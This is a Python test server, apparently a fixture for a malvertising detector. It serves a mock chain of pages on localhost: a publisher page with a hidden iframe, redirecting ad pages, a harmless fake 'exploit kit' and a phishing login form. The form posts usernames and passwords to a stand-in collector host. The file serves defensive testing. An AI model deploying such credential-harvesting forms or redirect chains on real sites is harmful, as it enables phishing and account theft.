"""
A mock malvertising chain, for exercising fan-out spawning.

Real malvertising does not put the payload on the page you visited. It puts
an ad slot there, which redirects to a broker, which opens a pop-under, which
lands on the exploit kit. A bot that only reads the first page sees nothing.

Layout served here:

    /              clean publisher, carries two ad slots
    /ad/rotator    ad broker, redirects onward
    /ad/interstial popup opener
    /land/kit      the exploit kit  <- only reachable 2-3 hops in
    /land/phish    credential harvester

Entirely synthetic. Nothing here exploits anything; the "kit" page only
contains the harmless obfuscation-shaped strings the detector looks for.

Run: python tests/mock_ad_chain.py     (port 8081)
"""
from http.server import BaseHTTPRequestHandler, HTTPServer

PUBLISHER = b"""<!DOCTYPE html><html><head><title>Daily Business Review</title></head>
<body>
<h1>Markets close higher on tech rally</h1>
<p>Analysts pointed to strong earnings across the sector.</p>
<div id="banner-top"><a href="/ad/rotator" target="_blank">Sponsored: Enterprise Backup</a></div>
<p>More coverage after the break.</p>
<div class="ad-slot"><a href="/ad/interstitial" target="_blank">Advertisement</a></div>
<iframe src="/ad/rotator" width="1" height="1"></iframe>
</body></html>"""

ROTATOR = b"""<!DOCTYPE html><html><head><title>...</title>
<meta http-equiv="refresh" content="0; url=/land/kit"></head>
<body><p>Loading offer...</p>
<script>setTimeout(function(){ location.href='/land/kit'; }, 400);</script>
</body></html>"""

INTERSTITIAL = b"""<!DOCTYPE html><html><head><title>Offer</title></head>
<body><p>Your download is starting</p>
<script>window.open('/land/phish','_blank');</script>
<a href="/land/phish" target="_blank">Continue</a>
</body></html>"""

# Harmless strings shaped like the obfuscation the detector clusters on.
KIT = b"""<!DOCTYPE html><html><head><title>Update Required</title></head>
<body><h2>Plugin update</h2>
<script>
console.log(eval("'ok'"));
console.log(String.fromCharCode(104,105));
document.write(unescape('%68%69'));
</script>
<a href="/dl/update_installer.exe" download>update_installer.exe</a>
</body></html>"""

PHISH = b"""<!DOCTYPE html><html><head><title>Sign in</title></head>
<body><h2>Session expired</h2>
<form action="https://collector.invalid/submit" method="post">
<input type="text" name="username" placeholder="Email">
<input type="password" name="password" placeholder="Password">
<button type="submit">Sign in</button></form>
<script>console.log(atob('aGk='));</script>
</body></html>"""

ROUTES = {
    "/": PUBLISHER,
    "/ad/rotator": ROTATOR,
    "/ad/interstitial": INTERSTITIAL,
    "/land/kit": KIT,
    "/land/phish": PHISH,
}


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path.split("?")[0]

        if path.endswith(".exe"):
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition",
                             "attachment; filename=update_installer.exe")
            self.end_headers()
            self.wfile.write(b"FAKE_NONFUNCTIONAL_BYTES_FOR_TESTING_ONLY")
            return

        body = ROUTES.get(path)
        if body is None:
            self.send_response(404)
            self.end_headers()
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    print("Mock ad chain on http://127.0.0.1:8081")
    print("  /  -> /ad/rotator -> /land/kit        (redirect chain)")
    print("     -> /ad/interstitial -> /land/phish (popup chain)")
    HTTPServer(("127.0.0.1", 8081), Handler).serve_forever()
